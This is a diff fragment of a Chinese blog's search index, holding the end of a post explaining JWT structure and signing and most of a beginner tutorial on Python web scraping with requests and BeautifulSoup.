class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>这里面的前五个字段都是由 JWT 的标准所定义的，所谓<code>Registered claims</code></p>
+<ul>
+<li><code>iss</code>：该 JWT 的签发者</li>
+<li><code>sub</code>：该 JWT 所面向的用户</li>
+<li><code>aud</code>：接收该 JWT 的一方</li>
+<li><code>exp</code>（expires）：什么时候过期，这是 Unix 时间戳</li>
+<li><code>iat</code>（issued at）：在什么时候签发的。</li>
+</ul>
+<p>然后载荷会被Base64URL加密</p>
+<h3 id="签名"><a href="#签名" class="headerlink" title="签名"></a>签名</h3><p>把头部和载荷加密拼接后用之前确定的加密方式和secret进行签名，拼接在最后</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + &quot;.&quot; +</span><br><span class="line">  base64UrlEncode(payload),</span><br><span class="line">  secret)</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>这下搞明白之前Ek1ng问的伪造jwt的方式了，先<del>通过什么奇奇怪怪的方法</del>拿到secret，然后基于secret进行签名的构造</p>
+</blockquote>
+<h3 id="在线生成器"><a href="#在线生成器" class="headerlink" title="在线生成器"></a>在线生成器</h3><p><a class="link"   href="https://jwt.io/#debugger-io" >官方工具 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>  可在网站上直接生成JWT  <del>加密小玩具</del></p>
+<h2 id="Ending"><a href="#Ending" class="headerlink" title="Ending"></a>Ending</h2><blockquote>
+<p>一切都要有始有终</p>
+</blockquote>
+<p>没啥好说的，继续努力吧，本来就是什么都不会捏~</p>
+<blockquote>
+<p>参考文章</p>
+<p><a class="link"   href="https://zh.wikipedia.org/wiki/HTTP%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%81" >HTTP基本认证 - 维基百科 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   href="https://tsejx.github.io/blog/authentication/" >前端开发登录鉴权方案完全梳理 | mrsingsing <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP" >HTTP | MDN <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   href="http://ma5hr00m.top/posts/dev/usual-auth" >Web 鉴权方案 | 阿菇の博客  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   href="https://www.cnblogs.com/wangsongbai/p/10299655.html" >一篇文章彻底弄懂CAS实现SSO单点登录原理 - Hi，王松柏 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   href="https://jwt.io/" >JSON Web Tokens - jwt.io <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Web</category>
+        <category>开发</category>
+      </categories>
+      <tags>
+        <tag>jwt</tag>
+        <tag>web鉴权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>0x04 python爬虫的Baby级使用</title>
+    <url>/2023/11/23/BabyPySpider/</url>
+    <content><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><blockquote>
+<p>勿以浮沙筑高台</p>
+</blockquote>
+<p>Vidar-Team web方向学习计划第四弹！</p>
+<p>简单的爬虫，<del>有一说一我觉得只是个http请求的不能算爬虫</del> <del>拟虫也是虫</del></p>
+<p>在很多需要定制请求或者自动化发送请求的环境下，使用爬虫是很方便的选择</p>
+<p>同时也对信息搜集有很大帮助（</p>
+<br>
+
+<hr>
+<h2 id="相关库及使用"><a href="#相关库及使用" class="headerlink" title="相关库及使用"></a>相关库及使用</h2><p>目前主要用到的有requests和beautiful soup两个库</p>
+<blockquote>
+<p>还有已经被作为标准库的urllib，但是和requests库功能相近，requests库会更方便一点，就暂时没太用urllib库</p>
+<p>在解HackerGame 2023的模拟组委会的时候还用到了json和jsonpath</p>
+<p>这两个就等到后面再介绍了</p>
+</blockquote>
+<h3 id="依赖安装"><a href="#依赖安装" class="headerlink" title="依赖安装"></a>依赖安装</h3><p>python环境下安装库还是很简单的</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">pip install beautifulsoup4</span><br><span class="line">pip install requests</span><br><span class="line">pip install lxml</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>这里要注意，如果安装用的是<code>pip install beautifulsoup</code>会因为版本过老不支持py3而报错，会有建议显示<code> &quot;You&#39;re trying to run a very old release of Beautiful Soup under Python 3. This will not work.&quot;&lt;&gt;&quot;Please use Beautiful Soup 4, available through the pip package &#39;beautifulsoup4&#39;.&quot;</code> </p>
+<p>lxml是beautiful soup推荐的解释器，我安装的时候发现已经在<code>site-packages</code>里面了 </p>
+<p>btw，在VSCode里打开文件记得要通过打开文件夹再选择文件打开，这样文件夹会作为工作区，防止无法运行自动导入库等依赖错误</p>
+</blockquote>
+<p>好了，老规矩，上文档！</p>
+<p><a class="link"   href="https://www.runoob.com/python3/python-requests.html" >Python requests 模块 | 菜鸟教程 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a class="link"   href="https://beautifulsoup.readthedocs.io/zh-cn/v4.4.0/" >Beautiful Soup 4.4.0 文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> </p>
+<p>面向实例学习，启动！</p>
+<h3 id="Requests"><a href="#Requests" class="headerlink" title="Requests"></a>Requests</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 导入 requests 包</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置请求参数 和 请求头 （假装我是一个浏览器 ^_^）</span></span><br><span class="line">kw = &#123;<span class="string">&#x27;s&#x27;</span>:<span class="string">&#x27;python 教程&#x27;</span>&#125;  </span><br><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送请求</span></span><br><span class="line"><span class="comment"># params 接收一个字典或者字符串的查询参数，字典类型自动转换为url编码，不需要urlencode()</span></span><br><span class="line">response = requests.get(<span class="string">&quot;https://www.runoob.com/&quot;</span>, params = kw, headers = headers)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (response.status_code)	<span class="comment"># 查看响应状态码</span></span><br><span class="line"><span class="built_in">print</span> (response.encoding)		<span class="comment"># 查看响应头部字符编码</span></span><br><span class="line"><span class="built_in">print</span> (response.url)	<span class="comment"># 查看完整url地址</span></span><br><span class="line"><span class="built_in">print</span>(response.text)	<span class="comment"># 查看响应内容，response.text 返回的是Unicode格式的数据</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 导入 requests 包</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0&#x27;</span>&#125;  <span class="comment"># 设置请求头</span></span><br><span class="line">params = &#123;<span class="string">&#x27;key1&#x27;</span>: <span class="string">&#x27;value1&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>: <span class="string">&#x27;value2&#x27;</span>&#125;  <span class="comment"># 设置查询参数</span></span><br><span class="line">data = &#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;example&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123456&#x27;</span>&#125;  <span class="comment"># 设置请求体</span></span><br><span class="line"></span><br><span class="line">response = requests.post(<span class="string">&#x27;https://www.runoob.com&#x27;</span>, headers=headers, params=params, data=data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回网页内容</span></span><br><span class="line"><span class="built_in">print</span>(x.text)</span><br></pre></td></tr></table></figure></div>
+
+<p><del>感觉看完这两个例子就已经会了</del> 其实和改包区别不大，有http基础应该 <del>秒懂</del> 学起来很快的    </p>
+<h3 id="Beautiful-Soup"><a href="#Beautiful-Soup" class="headerlink" title="Beautiful Soup"></a>Beautiful Soup</h3><p>然后是稍微复杂一点的beautiful soup</p>
+<p>逻辑大概就是bs4会将获得的文档转化成树形结构，节点转化为python对象</p>
+<p>对象有<code>Tag</code> <code>NavigableString</code> <code>BeautifulSoup</code> <code>Comment</code> 四种，可以调用方法和属性进行处理</p>
+<blockquote>
+<p><del>一直觉得爬虫文档写的逻辑都很诡异，不知道是思维差异还是什么原因，感觉先快速开始再安装、先介绍一堆复杂对象再介绍文档树遍历和搜索很诡异，大概是为了相关知识的完备性做出的让步吧。但不得不说看的时候挺难受的，很容易云里雾里。</del> </p>
+<p>没好好看快速开始是我的错，红豆泥私密马赛！！！ 有时候还是应该跳跃式、联想式阅读，有利于理解，但是把每个部分都搞清楚也很重要。</p>
+<p>唉，学习真复杂~  </p>
+</blockquote>
+<p>最主要的还是<code>tag</code>吧，可以使用点取属性，或者使用方法来取，<code>tag</code>看作字典可以<code>[]</code>取</p>
+<p>点取只能取到第一条，后面即使符合属性要求也是取不到的</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#这个是doc中的示例文档，后面的示例都对照这个</span></span><br><span class="line">html_doc = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;html&gt;&lt;head&gt;&lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;p class=&quot;title&quot;&gt;&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;p class=&quot;story&quot;&gt;Once upon a time there were three little sisters; and their names were</span></span><br><span class="line"><span class="string">&lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,</span></span><br><span class="line"><span class="string">&lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt; and</span></span><br><span class="line"><span class="string">&lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;;</span></span><br><span class="line"><span class="string">and they lived at the bottom of a well.&lt;/p&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<h4 id="基础功能"><a href="#基础功能" class="headerlink" title="基础功能"></a>基础功能</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 以下为doc中示例，具体tag的值要根据实际情况调整</span></span><br><span class="line"><span class="built_in">print</span>(soup.prettify())	<span class="comment">#可以这样看一下页面内容的结构化输出</span></span><br><span class="line"></span><br><span class="line">soup.title</span><br><span class="line"><span class="comment"># &lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;</span></span><br><span class="line"></span><br><span class="line">soup.title.name</span><br><span class="line"><span class="comment"># u&#x27;title&#x27;</span></span><br><span class="line"></span><br><span class="line">soup.title.string</span><br><span class="line"><span class="comment"># u&#x27;The Dormouse&#x27;s story&#x27;</span></span><br><span class="line"></span><br><span class="line">soup.title.parent.name</span><br><span class="line"><span class="comment"># u&#x27;head&#x27;</span></span><br><span class="line"></span><br><span class="line">soup.p</span><br><span class="line"><span class="comment"># &lt;p class=&quot;title&quot;&gt;&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;&lt;/p&gt;</span></span><br><span class="line"></span><br><span class="line">soup.p[<span class="string">&#x27;class&#x27;</span>]</span><br><span class="line"><span class="comment"># u&#x27;title&#x27;</span></span><br><span class="line"></span><br><span class="line">soup.a</span><br><span class="line"><span class="comment"># &lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;</span></span><br><span class="line"></span><br><span class="line">soup.find_all(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment"># [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,</span></span><br><span class="line"><span class="comment">#  &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;,</span></span><br><span class="line"><span class="comment">#  &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;]</span></span><br><span class="line"></span><br><span class="line">soup.find(<span class="built_in">id</span>=<span class="string">&quot;link3&quot;</span>)</span><br><span class="line"><span class="comment"># &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> link <span class="keyword">in</span> soup.find_all(<span class="string">&#x27;a&#x27;</span>):		<span class="comment">#从文档中找到所有&lt;a&gt;标签的链接:</span></span><br><span class="line">    <span class="built_in">print</span>(link.get(<span class="string">&#x27;href&#x27;</span>))		</span><br><span class="line">    <span class="comment"># http://example.com/elsie</span></span><br><span class="line">    <span class="comment"># http://example.com/lacie</span></span><br><span class="line">    <span class="comment"># http://example.com/tillie</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(soup.get_text())		<span class="comment">#从文档中获取所有文字内容:</span></span><br><span class="line"><span class="comment"># The Dormouse&#x27;s story</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># The Dormouse&#x27;s story</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Once upon a time there were three little sisters; and their names were</span></span><br><span class="line"><span class="comment"># Elsie,</span></span><br><span class="line"><span class="comment"># Lacie and</span></span><br><span class="line"><span class="comment"># Tillie;</span></span><br><span class="line"><span class="comment"># and they lived at the bottom of a well.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># ...</span></span><br></pre></td></tr></table></figure></div>
+
+<h4 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h4><h5 id="一重遍历："><a href="#一重遍历：" class="headerlink" title="一重遍历："></a>一重遍历：</h5><p><code>.contents</code> 	列表形式输出tag子节点  </p>
+<p><code>.parent</code> 输出父节点</p>
+<p><code>.childen</code> 生成器，对tag子节点循环 </p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">head_tag = soup.head</span><br><span class="line">title_tag = head_tag.contents[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> child <span class="keyword">in</span> title_tag.children:</span><br><span class="line">    <span class="built_in">print</span>(child)</span><br><span class="line">    <span class="comment"># The Dormouse&#x27;s story</span></span><br></pre></td></tr></table></figure></div>
+
+<p><code>.string</code> 输出唯一<code>NavigableString</code>子节点内容 或唯一的<code>tag</code>子节点的<code>.string</code>结果</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">title_tag.string</span><br><span class="line"><span class="comment"># u&#x27;The Dormouse&#x27;s story&#x27;</span></span><br><span class="line"></span><br><span class="line">head_tag.contents</span><br><span class="line"><span class="comment"># [&lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;]</span></span><br><span class="line"></span><br><span class="line">head_tag.string</span><br><span class="line"><span class="comment"># u&#x27;The Dormouse&#x27;s story&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(soup.html.string)		<span class="comment">#多子节点会无法确定调用目标</span></span><br><span class="line"><span class="comment"># None</span></span><br></pre></td></tr></table></figure></div>
+
+<p><code>.next_sibling</code> <code>.previous_sibling</code> 输出兄弟节点 （实际很有可能是字符串或空白）</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">link = soup.a</span><br><span class="line">link</span><br><span class="line"><span class="comment"># &lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;</span></span><br><span class="line"></span><br><span class="line">link.next_sibling</span><br><span class="line"><span class="comment"># u&#x27;,\n&#x27;</span></span><br><span class="line"></span><br><span class="line">link.next_sibling.next_sibling</span><br><span class="line"><span class="comment"># &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><code>.next_element</code> <code>.previous_element</code> 输出下&#x2F;上一个解析对象</p>
+<h5 id="多重遍历："><a href="#多重遍历：" class="headerlink" title="多重遍历："></a>多重遍历：</h5><p><code>.descendants</code> 生成器，对tag所有子孙节点递归</p>
+<p><code>.parents</code> 生成器，对所有父辈节点递归</p>
+<p><code>.next_siblings</code> <code>.previous_siblings</code> 生成器，对所有兄弟节点迭代</p>
+<p><code>.next_elements</code>  <code>.previous_elements</code> 生成器，对解析对象迭代（重现解析过程）</p>
+<h4 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h4><h5 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h5><p>字符串： 很简单，完全匹配才会输出（不多不少）</p>
+<blockquote>
+<p>如果传字节码默认是<code>UTF-8</code>，可以传<code>Unicode</code>编码来防止解析错误</p>
+</blockquote>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">soup.find_all(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"><span class="comment"># [&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;]</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>正则表达式： 其实就是通过<code>match()</code>来匹配</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> tag <span class="keyword">in</span> soup.find_all(re.<span class="built_in">compile</span>(<span class="string">&quot;^b&quot;</span>)):		<span class="comment">#首字母匹配</span></span><br><span class="line">    <span class="built_in">print</span>(tag.name)</span><br><span class="line"><span class="comment"># body</span></span><br><span class="line"><span class="comment"># b</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> tag <span class="keyword">in</span> soup.find_all(re.<span class="built_in">compile</span>(<span class="string">&quot;t&quot;</span>)):		<span class="comment">#包含匹配</span></span><br><span class="line">    <span class="built_in">print</span>(tag.name)</span><br><span class="line"><span class="comment"># html</span></span><br><span class="line"><span class="comment"># title</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>列表：相当于匹配多个字符串，与任一字符串匹配就输出</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">soup.find_all([<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>])</span><br><span class="line"><span class="comment"># [&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;,</span></span><br><span class="line"><span class="comment">#  &lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,</span></span><br><span class="line"><span class="comment">#  &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;,</span></span><br><span class="line"><span class="comment">#  &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;]</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>True：匹配任何值</p>
+<blockquote>
+<p>可以像下面一样用来查出所有的<code>tag</code></p>
+</blockquote>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> tag <span class="keyword">in</span> soup.find_all(<span class="literal">True</span>):</span><br><span class="line">    <span class="built_in">print</span>(tag.name)</span><br><span class="line"><span class="comment"># html</span></span><br><span class="line"><span class="comment"># head</span></span><br><span class="line"><span class="comment"># title</span></span><br><span class="line"><span class="comment"># body</span></span><br><span class="line"><span class="comment"># p</span></span><br><span class="line"><span class="comment"># b</span></span><br><span class="line"><span class="comment"># p</span></span><br><span class="line"><span class="comment"># a</span></span><br><span class="line"><span class="comment"># a</span></span><br><span class="line"><span class="comment"># a</span></span><br><span class="line"><span class="comment"># p</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>方法：创造力！<del>没有！</del> </p>
+<p>本质是基于传入的tag做一个判断，返回<code>True</code>就保存为结果，<code>False</code>就下一个</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">has_class_but_no_id</span>(<span class="params">tag</span>):</span><br><span class="line">    <span class="keyword">return</span> tag.has_attr(<span class="string">&#x27;class&#x27;</span>) <span class="keyword">and</span> <span class="keyword">not</span> tag.has_attr(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line"></span><br><span class="line">soup.find_all(has_class_but_no_id)</span><br><span class="line"><span class="comment"># [&lt;p class=&quot;title&quot;&gt;&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;&lt;/p&gt;,</span></span><br><span class="line"><span class="comment">#  &lt;p class=&quot;story&quot;&gt;Once upon a time there were...&lt;/p&gt;,</span></span><br><span class="line"><span class="comment">#  &lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;]</span></span><br></pre></td></tr></table></figure></div>
+
+<p>还有更复杂亿点点的</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#过滤出前后都有文字的标签</span></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> NavigableString</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">surrounded_by_strings</span>(<span class="params">tag</span>):</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">isinstance</span>(tag.next_element, NavigableString)</span><br><span class="line">            <span class="keyword">and</span> <span class="built_in">isinstance</span>(tag.previous_element, NavigableString))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> tag <span class="keyword">in</span> soup.find_all(surrounded_by_strings):</span><br><span class="line">    <span class="built_in">print</span> tag.name</span><br><span class="line"><span class="comment"># p</span></span><br><span class="line"><span class="comment"># a</span></span><br><span class="line"><span class="comment"># a</span></span><br><span class="line"><span class="comment"># a</span></span><br><span class="line"><span class="comment"># p</span></span><br></pre></td></tr></table></figure></div>
+
+<h5 id="find-all方法"><a href="#find-all方法" class="headerlink" title="find_all方法"></a>find_all方法</h5><p>搜索当前<code>tag</code>所有<code>tag</code>子节点的内容，匹配过滤器条件</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># K1r4Ca援引bs4库如是说</span></span><br><span class="line">(method) <span class="keyword">def</span> <span class="title function_">find_all</span>(<span class="params"></span></span><br><span class="line"><span class="params">    name: _Strainable = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    attrs: _Strainable | <span class="built_in">dict</span>[<span class="built_in">str</span>, _Strainable] = &#123;&#125;,</span></span><br><span class="line"><span class="params">    recursive: <span class="built_in">bool</span> = <span class="literal">True</span>,</span></span><br><span class="line"><span class="params">    string: _Strainable = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    limit: <span class="built_in">int</span> | <span class="literal">None</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    **kwargs: _Strainable</span></span><br><span class="line"><span class="params"></span>) -&gt; ResultSet[<span class="type">Any</span>]</span><br></pre></td></tr></table></figure></div>
+
+<p><code>name</code> 参数：查找<code>tag</code>，无视字符串节点</p>
+<p><code>keyword</code> 参数： 把该参数作为指定的属性来搜索（看示例会更好懂）</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">soup.find_all(<span class="built_in">id</span>=<span class="string">&#x27;link2&#x27;</span>)</span><br><span class="line"><span class="comment"># [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;]</span></span><br><span class="line"></span><br><span class="line">soup.find_all(href=re.<span class="built_in">compile</span>(<span class="string">&quot;elsie&quot;</span>))</span><br><span class="line"><span class="comment"># [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;]</span></span><br><span class="line"></span><br><span class="line">soup.find_all(<span class="built_in">id</span>=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,</span></span><br><span class="line"><span class="comment">#  &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;,</span></span><br><span class="line"><span class="comment">#  &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;]</span></span><br><span class="line"></span><br><span class="line">soup.find_all(href=re.<span class="built_in">compile</span>(<span class="string">&quot;elsie&quot;</span>), <span class="built_in">id</span>=<span class="string">&#x27;link1&#x27;</span>)</span><br><span class="line"><span class="comment"># [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;three&lt;/a&gt;]</span></span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>有些属性不能直接搜索，如<code>HTML5</code>的<code>data-*</code></p>
+<p>但可以通过<code>attrs</code>设置字典来搜索</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">data_soup = BeautifulSoup(<span class="string">&#x27;&lt;div data-foo=&quot;value&quot;&gt;foo!&lt;/div&gt;&#x27;</span>)</span><br><span class="line">data_soup.find_all(data-foo=<span class="string">&quot;value&quot;</span>)</span><br><span class="line"><span class="comment"># SyntaxError: keyword can&#x27;t be an expression</span></span><br><span class="line"></span><br><span class="line">data_soup.find_all(attrs=&#123;<span class="string">&quot;data-foo&quot;</span>: <span class="string">&quot;value&quot;</span>&#125;)</span><br><span class="line"><span class="comment"># [&lt;div data-foo=&quot;value&quot;&gt;foo!&lt;/div&gt;]</span></span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<p>按<code>CSS class</code>搜索：通过<code>class_</code>参数，接受不同过滤器，多值属性可分别搜索</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">soup.find_all(<span class="string">&quot;a&quot;</span>, class_=<span class="string">&quot;sister&quot;</span>)</span><br><span class="line"><span class="comment"># [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,</span></span><br><span class="line"><span class="comment">#  &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;,</span></span><br><span class="line"><span class="comment">#  &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;]</span></span><br><span class="line"></span><br><span class="line">soup.find_all(class_=re.<span class="built_in">compile</span>(<span class="string">&quot;itl&quot;</span>))</span><br><span class="line"><span class="comment"># [&lt;p class=&quot;title&quot;&gt;&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;&lt;/p&gt;]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">has_six_characters</span>(<span class="params">css_class</span>):</span><br><span class="line">    <span class="keyword">return</span> css_class <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> <span class="built_in">len</span>(css_class) == <span class="number">6</span></span><br><span class="line"></span><br><span class="line">soup.find_all(class_=has_six_characters)</span><br><span class="line"><span class="comment"># [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,</span></span><br><span class="line"><span class="comment">#  &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;,</span></span><br><span class="line"><span class="comment">#  &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;]</span></span><br><span class="line"></span><br><span class="line">css_soup = BeautifulSoup(<span class="string">&#x27;&lt;p class=&quot;body strikeout&quot;&gt;&lt;/p&gt;&#x27;</span>)</span><br><span class="line">css_soup.find_all(<span class="string">&quot;p&quot;</span>, class_=<span class="string">&quot;strikeout&quot;</span>)</span><br><span class="line"><span class="comment"># [&lt;p class=&quot;body 